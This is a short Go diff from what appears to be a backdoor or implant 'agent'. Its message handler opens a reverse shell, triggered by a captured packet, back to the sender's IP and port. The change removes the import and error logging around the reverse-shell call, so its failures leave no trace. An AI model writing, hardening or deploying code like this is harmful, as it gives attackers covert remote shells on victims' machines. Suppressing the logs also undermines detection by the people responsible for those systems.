@@ -5,7 +5,6 @@ package agent
 import (
 	"context"
 	"fmt"
-	"log"
 	"net"
 	"strconv"
 	"time"
@@ -89,9 +88,7 @@ func handleMessage(msg *message.Message) error {
 		// Opens a reverse shell on port specified in packet
 		case message.Shell:
 			go func() {
-				if err := executor.OpenPcapReverseShell(msg); err != nil {
-					log.Printf("opening reverse shell to %s:%s: %v", msg.SrcIP, msg.SrcPort, err)
-				}
+				_ = executor.OpenPcapReverseShell(msg)
 			}()
 			return nil
 		}
